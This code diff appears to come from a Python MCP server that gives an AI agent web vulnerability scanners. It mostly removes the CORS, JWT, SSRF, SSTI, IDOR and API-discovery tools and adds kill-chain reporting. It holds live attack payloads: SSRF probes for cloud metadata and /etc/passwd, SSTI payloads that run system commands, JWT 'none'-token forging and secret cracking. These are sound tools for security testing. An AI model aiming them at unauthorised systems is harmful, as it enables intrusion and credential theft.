-                acao = line.split(":", 1)[-1].strip()
-            if "access-control-allow-credentials" in ll:
-                acac = line.split(":", 1)[-1].strip()
-
-        vulnerable = False
-        vuln_type = ""
-        if acao == "*":
-            vulnerable = True
-            vuln_type = "wildcard_origin"
-        elif acao == origin:
-            vulnerable = True
-            vuln_type = "reflected_origin"
-        elif acao == "null" and origin == "null":
-            vulnerable = True
-            vuln_type = "null_origin_allowed"
-
-        if vulnerable and acac.lower() == "true":
-            vuln_type += "+credentials"
-
-        results.append({
-            "origin_tested": origin, "acao": acao, "acac": acac,
-            "vulnerable": vulnerable, "vuln_type": vuln_type
-        })
-
-    progress.update("Analyzing preflight")
-    preflight_cmd = ["curl", "-sI", "-k", "--max-time", "10", "-X", "OPTIONS",
-                    "-H", "Origin: https://attacker.com",
-                    "-H", "Access-Control-Request-Method: PUT",
-                    "-H", "Access-Control-Request-Headers: X-Custom", url]
-    preflight_r = run_command_advanced(preflight_cmd, timeout=15, trace=trace)
-
-    progress.update("Analysis")
-    vulns = [r for r in results if r["vulnerable"]]
-    output = {
-        "status": "success", "target": url,
-        "total_tests": len(results), "vulnerabilities_found": len(vulns),
-        "results": results,
-        "preflight_response": preflight_r["stdout"][:1000],
-        "severity": "CRITICAL" if any("+credentials" in r.get("vuln_type", "") for r in vulns) else
-                   ("HIGH" if vulns else "info"),
-        "recommendations": [
-            "Never reflect arbitrary origins",
-            "Avoid wildcard (*) with credentials",
-            "Whitelist specific trusted origins",
-            "Validate Origin header server-side"
-        ] if vulns else ["CORS configuration appears secure"]
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("cors_scanner", target, output)
-    log_tool_execution("cors_scanner", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def jwt_analyzer(
-    token: str,
-    secret_wordlist: str = "",
-    timeout: int = 60
-) -> str:
-    """
-    JWT token security analyzer. Decodes header/payload, checks algorithm confusion, none algorithm, weak secrets, expiration issues.
-    """
-    target = "jwt_analysis"
-    trace, progress, exec_dir = _init_tool_context("jwt_analyzer", target, 6)
-    inputs = {"token_length": len(token), "has_wordlist": bool(secret_wordlist)}
-
-    progress.update("Decoding JWT")
-    parts = token.split(".")
-    if len(parts) != 3:
-        output = {"status": "error", "message": "Invalid JWT format (expected 3 parts)"}
-        log_tool_execution("jwt_analyzer", target, inputs, output, trace, progress)
-        return json.dumps(output, indent=2)
-
-    def b64_decode(s):
-        s += "=" * (4 - len(s) % 4)
-        try:
-            return json.loads(base64.urlsafe_b64decode(s))
-        except Exception:
-            return {"error": "decode_failed"}
-
-    header = b64_decode(parts[0])
-    payload = b64_decode(parts[1])
-
-    progress.update("Analyzing header")
-    vulnerabilities = []
-    alg = header.get("alg", "unknown")
-    if alg.lower() == "none":
-        vulnerabilities.append({"type": "none_algorithm", "severity": "CRITICAL",
-                               "description": "Algorithm set to 'none' - signature bypass possible"})
-    if alg.startswith("HS") and header.get("typ") == "JWT":
-        vulnerabilities.append({"type": "hmac_algorithm", "severity": "MEDIUM",
-                               "description": "HMAC algorithm used - vulnerable to key confusion if RSA expected"})
-    if "kid" in header:
-        vulnerabilities.append({"type": "kid_injection", "severity": "HIGH",
-                               "description": "KID header present - test for SQL injection or path traversal in kid value"})
-    if "jku" in header or "x5u" in header:
-        vulnerabilities.append({"type": "external_key_url", "severity": "HIGH",
-                               "description": "External key URL present (jku/x5u) - SSRF possible"})
-
-    progress.update("Analyzing payload")
-    now = int(time.time())
-    exp = payload.get("exp")
-    iat = payload.get("iat")
-    nbf = payload.get("nbf")
-    if exp and exp < now:
-        vulnerabilities.append({"type": "expired_token", "severity": "LOW",
-                               "description": f"Token expired at {datetime.datetime.fromtimestamp(exp).isoformat()}"})
-    if exp and iat and (exp - iat) > 86400 * 30:
-        vulnerabilities.append({"type": "long_expiry", "severity": "MEDIUM",
-                               "description": "Token has very long expiry (>30 days)"})
-    if not exp:
-        vulnerabilities.append({"type": "no_expiry", "severity": "HIGH",
-                               "description": "Token has no expiration claim"})
-
-    sensitive_claims = ["password", "secret", "key", "token", "credit_card", "ssn"]
-    for claim in payload:
-        if any(s in claim.lower() for s in sensitive_claims):
-            vulnerabilities.append({"type": "sensitive_data_in_payload", "severity": "HIGH",
-                                   "claim": claim, "description": f"Potentially sensitive claim: {claim}"})
-
-    progress.update("Testing none algorithm bypass")
-    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
-    none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
-    none_token = f"{none_header}.{none_payload}."
-
-    progress.update("Secret brute force attempt")
-    common_secrets = ["secret", "password", "123456", "admin", "key", "jwt_secret",
-                     "changeme", "supersecret", "HS256", "your-256-bit-secret"]
-    cracked_secret = None
-    if alg.startswith("HS"):
-        import hmac as hmac_mod
-        for secret in common_secrets:
-            try:
-                signing_input = f"{parts[0]}.{parts[1]}".encode()
-                if alg == "HS256":
-                    sig = hmac_mod.new(secret.encode(), signing_input, hashlib.sha256).digest()
-                elif alg == "HS384":
-                    sig = hmac_mod.new(secret.encode(), signing_input, hashlib.sha384).digest()
-                elif alg == "HS512":
-                    sig = hmac_mod.new(secret.encode(), signing_input, hashlib.sha512).digest()
-                else:
-                    continue
-                expected_sig = base64.urlsafe_b64encode(sig).decode().rstrip("=")
-                if expected_sig == parts[2]:
-                    cracked_secret = secret
-                    vulnerabilities.append({"type": "weak_secret", "severity": "CRITICAL",
-                                           "secret": secret, "description": f"JWT secret cracked: {secret}"})
-                    break
-            except Exception:
-                pass
-
-    progress.update("Complete")
-    output = {
-        "status": "success", "header": header, "payload": payload,
-        "algorithm": alg,
-        "vulnerabilities": vulnerabilities,
-        "vulnerability_count": len(vulnerabilities),
-        "none_algorithm_token": none_token,
-        "cracked_secret": cracked_secret,
-        "timestamps": {
-            "issued_at": datetime.datetime.fromtimestamp(iat).isoformat() if iat else None,
-            "expires_at": datetime.datetime.fromtimestamp(exp).isoformat() if exp else None,
-            "not_before": datetime.datetime.fromtimestamp(nbf).isoformat() if nbf else None
-        },
-        "severity": "CRITICAL" if any(v["severity"] == "CRITICAL" for v in vulnerabilities) else
-                   ("HIGH" if any(v["severity"] == "HIGH" for v in vulnerabilities) else "info")
-    }
-
-    output = chain_engine.enrich_with_context("jwt_analyzer", target, output)
-    log_tool_execution("jwt_analyzer", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def ssrf_scanner(
-    target: str,
-    param: str = "url",
-    method: str = "GET",
-    timeout: int = 60
-) -> str:
-    """
-    SSRF (Server-Side Request Forgery) vulnerability scanner. Tests internal network access, cloud metadata, protocol smuggling.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("ssrf_scanner", target, 5)
-    url = target if target.startswith("http") else f"http://{target}"
-    inputs = {"target": url, "param": param, "method": method}
-
-    progress.update("Preparing SSRF payloads")
-    ssrf_payloads = [
-        {"name": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/", "severity": "CRITICAL"},
-        {"name": "GCP metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/", "severity": "CRITICAL"},
-        {"name": "Azure metadata", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "severity": "CRITICAL"},
-        {"name": "Localhost", "payload": "http://127.0.0.1/", "severity": "HIGH"},
-        {"name": "Localhost alt", "payload": "http://0.0.0.0/", "severity": "HIGH"},
-        {"name": "IPv6 localhost", "payload": "http://[::1]/", "severity": "HIGH"},
-        {"name": "Internal 10.x", "payload": "http://10.0.0.1/", "severity": "HIGH"},
-        {"name": "Internal 192.168.x", "payload": "http://192.168.1.1/", "severity": "HIGH"},
-        {"name": "Decimal IP", "payload": "http://2130706433/", "severity": "HIGH"},
-        {"name": "Hex IP", "payload": "http://0x7f000001/", "severity": "HIGH"},
-        {"name": "File protocol", "payload": "file:///etc/passwd", "severity": "CRITICAL"},
-        {"name": "Gopher protocol", "payload": "gopher://127.0.0.1:25/", "severity": "HIGH"},
-        {"name": "Dict protocol", "payload": "dict://127.0.0.1:6379/info", "severity": "HIGH"},
-        {"name": "URL redirect", "payload": "http://attacker.com/redirect?url=http://169.254.169.254/", "severity": "HIGH"},
-        {"name": "DNS rebinding", "payload": "http://1.1.1.1.nip.io/", "severity": "MEDIUM"},
-    ]
-
-    progress.update("Testing SSRF payloads")
-    results = []
-    for sp in ssrf_payloads:
-        test_url = f"{url}?{param}={urllib.parse.quote(sp['payload'])}" if method == "GET" else url
-        cmd = ["curl", "-sk", "--max-time", "10", "-o", "/dev/null", "-w",
-               "%{http_code}|%{size_download}|%{time_total}", test_url]
-        if method == "POST":
-            cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
-                   "-d", f"{param}={urllib.parse.quote(sp['payload'])}",
-                   "-o", "/dev/null", "-w", "%{http_code}|%{size_download}|%{time_total}", url]
-        r = run_command_advanced(cmd, timeout=15, trace=trace)
-        parts = r["stdout"].split("|")
-        status_code = parts[0] if parts else "0"
-        size = parts[1] if len(parts) > 1 else "0"
-        vuln_indicators = status_code in ["200", "301", "302"] and int(size or "0") > 0
-        results.append({
-            "name": sp["name"], "payload": sp["payload"], "severity": sp["severity"],
-            "status_code": status_code, "response_size": size,
-            "potentially_vulnerable": vuln_indicators
-        })
-
-    progress.update("Analysis")
-    vulns = [r for r in results if r["potentially_vulnerable"]]
-    output = {
-        "status": "success", "target": url, "parameter": param,
-        "total_tests": len(results), "potential_vulnerabilities": len(vulns),
-        "results": results,
-        "vulnerable_payloads": vulns,
-        "severity": "CRITICAL" if any(v["severity"] == "CRITICAL" and v["potentially_vulnerable"] for v in results) else
-                   ("HIGH" if vulns else "info"),
-        "recommendations": [
-            "Whitelist allowed URLs/domains",
-            "Block internal IP ranges (10.x, 172.16-31.x, 192.168.x)",
-            "Block cloud metadata IPs (169.254.169.254)",
-            "Disable unused URL schemes (file://, gopher://, dict://)",
-            "Use network-level egress filtering"
-        ] if vulns else ["No SSRF indicators detected"]
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("ssrf_scanner", target, output)
-    log_tool_execution("ssrf_scanner", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def header_security_audit(
-    target: str,
-    timeout: int = 30
-) -> str:
-    """
-    HTTP security headers audit. Checks CSP, HSTS, X-Frame-Options, CORS, cookie flags, and provides scoring.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("header_security_audit", target, 5)
-    url = target if target.startswith("http") else f"https://{target}"
-    inputs = {"target": url}
-
-    progress.update("Fetching HTTP headers")
-    cmd = ["curl", "-sI", "-k", "--max-time", "15", "-L", url]
-    result = run_command_advanced(cmd, timeout=20, trace=trace)
-
-    headers = {}
-    for line in result["stdout"].split("\n"):
-        if ":" in line:
-            k, _, v = line.partition(":")
-            headers[k.strip().lower()] = v.strip()
-
-    progress.update("Analyzing security headers")
-    checks = {}
-    score = 0
-    max_score = 0
-
-    header_checks = {
-        "strict-transport-security": {"weight": 15, "desc": "HSTS - Forces HTTPS",
-            "good_pattern": r"max-age=\d{7,}"},
-        "content-security-policy": {"weight": 15, "desc": "CSP - XSS prevention",
-            "good_pattern": r"(default-src|script-src)"},
-        "x-frame-options": {"weight": 10, "desc": "Clickjacking prevention",
-            "good_pattern": r"(DENY|SAMEORIGIN)"},
-        "x-content-type-options": {"weight": 10, "desc": "MIME type sniffing prevention",
-            "good_pattern": r"nosniff"},
-        "x-xss-protection": {"weight": 5, "desc": "XSS filter (legacy)",
-            "good_pattern": r"1;\s*mode=block"},
-        "referrer-policy": {"weight": 10, "desc": "Referrer info control",
-            "good_pattern": r"(no-referrer|strict-origin|same-origin)"},
-        "permissions-policy": {"weight": 10, "desc": "Feature/permissions policy",
-            "good_pattern": r".+"},
-        "x-permitted-cross-domain-policies": {"weight": 5, "desc": "Flash/PDF cross-domain",
-            "good_pattern": r"none"},
-        "cross-origin-opener-policy": {"weight": 5, "desc": "COOP - Cross-origin isolation",
-            "good_pattern": r"same-origin"},
-        "cross-origin-resource-policy": {"weight": 5, "desc": "CORP - Resource isolation",
-            "good_pattern": r"same-origin"},
-        "cross-origin-embedder-policy": {"weight": 5, "desc": "COEP - Embedding policy",
-            "good_pattern": r"require-corp"},
-        "cache-control": {"weight": 5, "desc": "Cache control directives",
-            "good_pattern": r"no-store|private"}
-    }
-
-    for header_name, check in header_checks.items():
-        max_score += check["weight"]
-        value = headers.get(header_name, "")
-        if value:
-            good = bool(re.search(check["good_pattern"], value, re.IGNORECASE))
-            if good:
-                score += check["weight"]
-            checks[header_name] = {
-                "present": True, "value": value, "secure": good,
-                "description": check["desc"],
-                "score": check["weight"] if good else 0
+        elif report_type == "header_audit":
+            hr = await run_command(["curl", "-sk", "-I", target], timeout=15)
+            headers = {}
+            missing = []
+            if hr.get("stdout"):
+                for line in hr["stdout"].split("\n"):
+                    if ": " in line:
+                        k, v = line.split(": ", 1)
+                        headers[k.strip().lower()] = v.strip()
+            security_headers = {
+                "strict-transport-security": "HSTS missing - vulnerable to downgrade",
+                "x-content-type-options": "Missing - MIME sniffing possible",
+                "x-frame-options": "Missing - clickjacking possible",
+                "content-security-policy": "CSP missing - XSS risk increased",
+                "x-xss-protection": "XSS protection header missing",
+                "referrer-policy": "Referrer leakage possible",
+                "permissions-policy": "Feature policy missing",
             }
-        else:
-            checks[header_name] = {
-                "present": False, "value": None, "secure": False,
-                "description": check["desc"], "score": 0,
-                "recommendation": f"Add {header_name} header"
+            for hdr, risk in security_headers.items():
+                if hdr not in headers:
+                    missing.append({"header": hdr, "risk": risk})
+            results["headers"] = headers
+            results["missing_security_headers"] = missing
+            results["score"] = f"{len(security_headers) - len(missing)}/{len(security_headers)}"
+        elif report_type == "executive":
+            # Executive-level risk summary
+            correlation = vuln_correlator.correlate(target)
+            kc = kill_chain.get_progress(target)
+            results["executive_summary"] = {
+                "risk_rating": correlation["risk_rating"],
+                "attack_surface_score": correlation["attack_surface_score"],
+                "total_vulnerabilities": correlation["total_vulns"],
+                "severity_breakdown": correlation["by_severity"],
+                "exploit_chains_count": len(correlation["exploit_chains"]),
+                "top_exploit_chains": correlation["exploit_chains"][:5],
+                "recommended_attack_path": correlation["recommended_attack_path"],
+                "mitre_coverage": len(correlation["mitre_coverage"]),
+                "kill_chain_completion": kc["completion_pct"],
+                "immediate_actions": [],
             }
-
-    progress.update("Checking dangerous headers")
-    dangerous = {}
-    for dh in ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]:
-        if dh in headers:
-            dangerous[dh] = headers[dh]
-
-    cookies_analysis = []
-    set_cookie = headers.get("set-cookie", "")
-    if set_cookie:
-        flags = {"httponly": "HttpOnly" in set_cookie, "secure": "Secure" in set_cookie,
-                "samesite": "SameSite" in set_cookie}
-        cookies_analysis.append({"value_preview": set_cookie[:100], "flags": flags})
-
-    progress.update("Scoring")
-    grade = "A+" if score >= max_score * 0.95 else "A" if score >= max_score * 0.85 else \
-            "B" if score >= max_score * 0.70 else "C" if score >= max_score * 0.50 else \
-            "D" if score >= max_score * 0.30 else "F"
-
-    output = {
-        "status": "success", "target": url,
-        "score": score, "max_score": max_score,
-        "grade": grade, "percentage": round(score / max_score * 100, 1) if max_score else 0,
-        "header_checks": checks,
-        "information_disclosure": dangerous,
-        "cookies": cookies_analysis,
-        "missing_headers": [k for k, v in checks.items() if not v["present"]],
-        "severity": "HIGH" if grade in ["D", "F"] else ("MEDIUM" if grade == "C" else "info")
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("header_security_audit", target, output)
-    log_tool_execution("header_security_audit", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# DISCOVERY & TESTING TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def api_endpoint_discovery(
-    target: str,
-    wordlist: str = "",
-    methods_to_test: str = "GET,POST,PUT,DELETE,PATCH",
-    timeout: int = 120
-) -> str:
-    """
-    API endpoint discovery and testing. Discovers REST/GraphQL endpoints, tests methods, and identifies authentication requirements.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("api_endpoint_discovery", target, 6)
-    url = target if target.startswith("http") else f"https://{target}"
-    inputs = {"target": url, "methods": methods_to_test}
-
-    progress.update("Testing common API paths")
-    api_paths = [
-        "/api", "/api/v1", "/api/v2", "/api/v3", "/graphql", "/graphiql",
-        "/api/docs", "/swagger.json", "/openapi.json", "/swagger-ui",
-        "/api-docs", "/.well-known/openid-configuration", "/health", "/status",
-        "/api/health", "/api/status", "/api/users", "/api/admin",
-        "/api/login", "/api/register", "/api/token", "/api/auth",
-        "/rest", "/rest/v1", "/wp-json", "/wp-json/wp/v2",
-        "/api/config", "/api/settings", "/api/info", "/api/debug",
-        "/api/graphql", "/query", "/api/query", "/_api",
-        "/v1", "/v2", "/api/swagger", "/docs", "/redoc"
-    ]
-
-    results = []
-    for path in api_paths:
-        test_url = url.rstrip("/") + path
-        cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
-               "-w", "%{http_code}|%{size_download}|%{content_type}", test_url]
-        r = run_command_advanced(cmd, timeout=12, trace=trace)
-        parts = r["stdout"].split("|")
-        status = int(parts[0]) if parts and parts[0].isdigit() else 0
-        size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
-        ctype = parts[2] if len(parts) > 2 else ""
-        if status > 0 and status != 404:
-            results.append({"path": path, "url": test_url, "status": status,
-                          "size": size, "content_type": ctype})
-
-    progress.update("Testing GraphQL introspection")
-    gql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/query"]
-    gql_results = []
-    for gql_path in gql_endpoints:
-        gql_url = url.rstrip("/") + gql_path
-        introspection = '{"query": "{ __schema { types { name } } }"}'
-        gql_cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
-                   "-H", "Content-Type: application/json", "-d", introspection, gql_url]
-        gql_r = run_command_advanced(gql_cmd, timeout=15, trace=trace)
-        if "__schema" in gql_r["stdout"] or "types" in gql_r["stdout"]:
-            gql_results.append({"endpoint": gql_path, "introspection_enabled": True,
-                              "preview": gql_r["stdout"][:500]})
-
-    progress.update("Testing HTTP methods")
-    method_results = {}
-    base_path = results[0]["path"] if results else "/api"
-    test_url = url.rstrip("/") + base_path
-    for method in methods_to_test.split(","):
-        method = method.strip()
-        cmd = ["curl", "-sk", "--max-time", "8", "-X", method,
-               "-o", "/dev/null", "-w", "%{http_code}", test_url]
-        r = run_command_advanced(cmd, timeout=12, trace=trace)
-        method_results[method] = int(r["stdout"]) if r["stdout"].isdigit() else 0
-
-    progress.update("Analysis")
-    high_interest = [r for r in results if r["status"] in [200, 201, 301, 302] and
-                    any(k in r["path"] for k in ["swagger", "openapi", "graphql", "admin", "debug", "config"])]
-
-    output = {
-        "status": "success", "target": url,
-        "endpoints_found": len(results),
-        "endpoints": results,
-        "graphql": {"introspection_results": gql_results, "introspection_exposed": bool(gql_results)},
-        "method_test": method_results,
-        "high_interest": high_interest,
-        "severity": "HIGH" if gql_results or high_interest else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("api_endpoint_discovery", target, output)
-    log_tool_execution("api_endpoint_discovery", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def subdomain_scanner(
-    target: str,
-    timeout: int = 120
-) -> str:
-    """
-    Quick subdomain scanner combining DNS brute force with HTTP probing. Lighter alternative to full subdomain_enum.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("subdomain_scanner", target, 5)
-    inputs = {"target": target}
-
-    progress.update("DNS brute force")
-    prefixes = ["www", "mail", "ftp", "admin", "dev", "staging", "test", "api", "app",
-               "portal", "vpn", "ns1", "ns2", "blog", "shop", "cdn", "static", "docs",
-               "git", "ci", "monitor", "db", "redis", "elastic", "auth", "sso", "login",
-               "webmail", "remote", "cloud", "beta", "demo", "sandbox", "backup", "old"]
-
-    found = []
-    for prefix in prefixes:
-        sub = f"{prefix}.{target}"
-        try:
-            ip = socket.gethostbyname(sub)
-            found.append({"subdomain": sub, "ip": ip})
-        except socket.gaierror:
-            pass
-
-    progress.update("HTTP probing")
-    live_subs = []
-    for sub_info in found:
-        for scheme in ["https", "http"]:
-            url = f"{scheme}://{sub_info['subdomain']}"
-            cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null",
-                   "-w", "%{http_code}|%{redirect_url}", url]
-            r = run_command_advanced(cmd, timeout=8, trace=trace)
-            parts = r["stdout"].split("|")
-            status = int(parts[0]) if parts and parts[0].isdigit() else 0
-            if status > 0 and status != 000:
-                sub_info["http_status"] = status
-                sub_info["url"] = url
-                sub_info["redirect"] = parts[1] if len(parts) > 1 else ""
-                live_subs.append(sub_info.copy())
-                break
-
-    progress.update("Certificate check")
-    crt_cmd = ["curl", "-s", "--max-time", "15", f"https://crt.sh/?q=%25.{target}&output=json"]
-    crt_result = run_command_advanced(crt_cmd, timeout=20, trace=trace)
-    crt_subs = set()
-    try:
-        for entry in json.loads(crt_result["stdout"]):
-            for name in entry.get("name_value", "").split("\n"):
-                name = name.strip().lower()
-                if name.endswith(f".{target}"):
-                    crt_subs.add(name)
-    except Exception:
-        pass
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target,
-        "dns_found": len(found), "live_subdomains": len(live_subs),
-        "certificate_subdomains": len(crt_subs),
-        "resolved_subdomains": found,
-        "live_http_subdomains": live_subs,
-        "crt_sh_subdomains": sorted(crt_subs)[:100]
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("subdomain_scanner", target, output)
-    log_tool_execution("subdomain_scanner", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def idor_tester(
-    target: str,
-    param: str = "id",
-    start_id: int = 1,
-    end_id: int = 20,
-    method: str = "GET",
-    auth_header: str = "",
-    timeout: int = 60
-) -> str:
-    """
-    IDOR (Insecure Direct Object Reference) tester. Iterates through object IDs to detect unauthorized access.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("idor_tester", target, 5)
-    url = target if target.startswith("http") else f"http://{target}"
-    inputs = {"target": url, "param": param, "range": f"{start_id}-{end_id}"}
-
-    progress.update("Testing IDOR")
-    results = []
-    baseline_sizes = set()
-
-    for i in range(start_id, min(end_id + 1, start_id + 50)):
-        if "{" + param + "}" in url:
-            test_url = url.replace("{" + param + "}", str(i))
-        elif f"{param}=" in url:
-            test_url = re.sub(f"{param}=\\d+", f"{param}={i}", url)
+            # Generate prioritized remediation actions
+            for chain in correlation.get("exploit_chains", [])[:3]:
+                results["executive_summary"]["immediate_actions"].append({
+                    "priority": "CRITICAL" if chain["severity"] == "critical" else "HIGH",
+                    "action": f"Remediate: {chain['chain']}",
+                    "impact": chain["yields"],
+                    "mitre": chain["mitre"],
+                })
+            results["executive_summary"]["total_findings"] = context["total_findings"]
         else:
-            sep = "&" if "?" in url else "?"
-            test_url = f"{url}{sep}{param}={i}"
-
-        cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}|%{size_download}", test_url]
-        if auth_header:
-            cmd.extend(["-H", auth_header])
-        r = run_command_advanced(cmd, timeout=12, trace=trace)
-
-        lines = r["stdout"].rsplit("\n", 1)
-        body = lines[0] if len(lines) > 1 else ""
-        meta = lines[-1] if lines else "0|0"
-        parts = meta.split("|")
-        status = int(parts[0]) if parts and parts[0].isdigit() else 0
-        size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
-
-        entry = {"id": i, "url": test_url, "status": status, "size": size}
-        if status == 200 and size > 0:
-            entry["accessible"] = True
-            entry["body_preview"] = body[:300]
-            baseline_sizes.add(size)
-        else:
-            entry["accessible"] = False
-        results.append(entry)
-
-    progress.update("Analyzing patterns")
-    accessible = [r for r in results if r.get("accessible")]
-    unique_sizes = len(set(r["size"] for r in accessible))
-    possibly_vulnerable = len(accessible) > 1 and unique_sizes > 1
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": url, "parameter": param,
-        "tested_range": f"{start_id}-{min(end_id, start_id + 49)}",
-        "accessible_count": len(accessible),
-        "total_tested": len(results),
-        "unique_response_sizes": unique_sizes,
-        "possibly_vulnerable": possibly_vulnerable,
-        "accessible_objects": accessible[:20],
-        "all_results": results[:30],
-        "severity": "HIGH" if possibly_vulnerable else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("idor_tester", target, output)
-    log_tool_execution("idor_tester", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def ssti_scanner(
-    target: str,
-    param: str = "name",
-    method: str = "GET",
-    data: str = "",
-    timeout: int = 60
-) -> str:
-    """
-    SSTI (Server-Side Template Injection) scanner. Tests for Jinja2, Twig, Freemarker, Mako, Pebble, and other template engines.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("ssti_scanner", target, 5)
-    url = target if target.startswith("http") else f"http://{target}"
-    inputs = {"target": url, "param": param, "method": method}
-
-    progress.update("Preparing SSTI payloads")
-    payloads = [
-        {"engine": "generic", "payload": "{{7*7}}", "expected": "49"},
-        {"engine": "generic", "payload": "${7*7}", "expected": "49"},
-        {"engine": "generic", "payload": "#{7*7}", "expected": "49"},
-        {"engine": "jinja2", "payload": "{{config}}", "expected": "SECRET_KEY"},
-        {"engine": "jinja2", "payload": "{{self.__class__.__mro__}}", "expected": "type"},
-        {"engine": "jinja2", "payload": "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval('7*7') }}{% endif %}{% endfor %}", "expected": "49"},
-        {"engine": "twig", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}", "expected": ""},
-        {"engine": "freemarker", "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "expected": "uid="},
-        {"engine": "mako", "payload": "${self.module.cache.util.os.popen('id').read()}", "expected": "uid="},
-        {"engine": "erb", "payload": "<%= 7*7 %>", "expected": "49"},
-        {"engine": "pebble", "payload": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}", "expected": "uid="},
-        {"engine": "smarty", "payload": "{php}echo 7*7;{/php}", "expected": "49"},
-        {"engine": "velocity", "payload": "#set($x=7*7)${x}", "expected": "49"},
-    ]
-
-    progress.update("Testing payloads")
-    results = []
-    for p in payloads:
-        encoded = urllib.parse.quote(p["payload"])
-        if method == "GET":
-            test_url = f"{url}?{param}={encoded}" if "?" not in url else f"{url}&{param}={encoded}"
-            cmd = ["curl", "-sk", "--max-time", "10", test_url]
-        else:
-            post_data = f"{param}={encoded}"
-            if data:
-                post_data = f"{data}&{post_data}"
-            cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST", "-d", post_data, url]
-
-        r = run_command_advanced(cmd, timeout=15, trace=trace)
-        found = p["expected"] and p["expected"] in r["stdout"]
-        results.append({
-            "engine": p["engine"], "payload": p["payload"],
-            "expected": p["expected"], "found": found,
-            "response_preview": r["stdout"][:300] if found else "",
-            "response_length": len(r["stdout"])
-        })
-
-    progress.update("Analysis")
-    vulns = [r for r in results if r["found"]]
-    detected_engines = list(set(r["engine"] for r in vulns))
-
-    output = {
-        "status": "success", "target": url, "parameter": param,
-        "payloads_tested": len(payloads), "vulnerabilities_found": len(vulns),
-        "detected_engines": detected_engines,
-        "vulnerable_payloads": vulns,
-        "all_results": results,
-        "severity": "CRITICAL" if vulns else "info",
-        "recommendations": [
-            "Use auto-escaping in templates",
-            "Sanitize user input before template rendering",
-            "Use sandboxed template environments",
-            "Avoid passing raw user input to template engines"
-        ] if vulns else ["No SSTI detected"]
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("ssti_scanner", target, output)
-    log_tool_execution("ssti_scanner", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def run_curl_advanced(
-    url: str,
-    method: str = "GET",
-    headers: str = "",
-    data: str = "",
-    follow_redirects: bool = True,
-    include_headers: bool = True,
-    proxy: str = "",
-    cookies: str = "",
-    auth: str = "",
-    timeout: int = 30
-) -> str:
-    """
-    Advanced curl wrapper with full control over HTTP requests. Supports custom headers, auth, proxies, cookies.
-    """
-    target = url.replace("http://", "").replace("https://", "").split("/")[0]
-    trace, progress, exec_dir = _init_tool_context("run_curl_advanced", target, 4)
-    inputs = {"url": url, "method": method, "has_data": bool(data)}
-
-    progress.update("Building request")
-    cmd = ["curl", "-sk", "--max-time", str(timeout)]
-    if method != "GET":
-        cmd.extend(["-X", method])
-    if include_headers:
-        cmd.append("-i")
-    if follow_redirects:
-        cmd.extend(["-L", "--max-redirs", "10"])
-    if headers:
-        for h in headers.split(";"):
-            if h.strip():
-                cmd.extend(["-H", h.strip()])
-    if data:
-        cmd.extend(["-d", data])
-    if proxy:
-        cmd.extend(["-x", proxy])
-    if cookies:
-        cmd.extend(["-b", cookies])
-    if auth:
-        cmd.extend(["-u", auth])
-    cmd.append(url)
-
-    progress.update("Executing request")
-    trace.command(f"curl {method} {url}")
-    result = run_command_advanced(cmd, timeout=timeout + 10, trace=trace)
-
-    progress.update("Parsing response")
-    response_headers = {}
-    body = result["stdout"]
-    if include_headers and "\r\n\r\n" in body:
-        header_section, body = body.split("\r\n\r\n", 1)
-        for line in header_section.split("\r\n"):
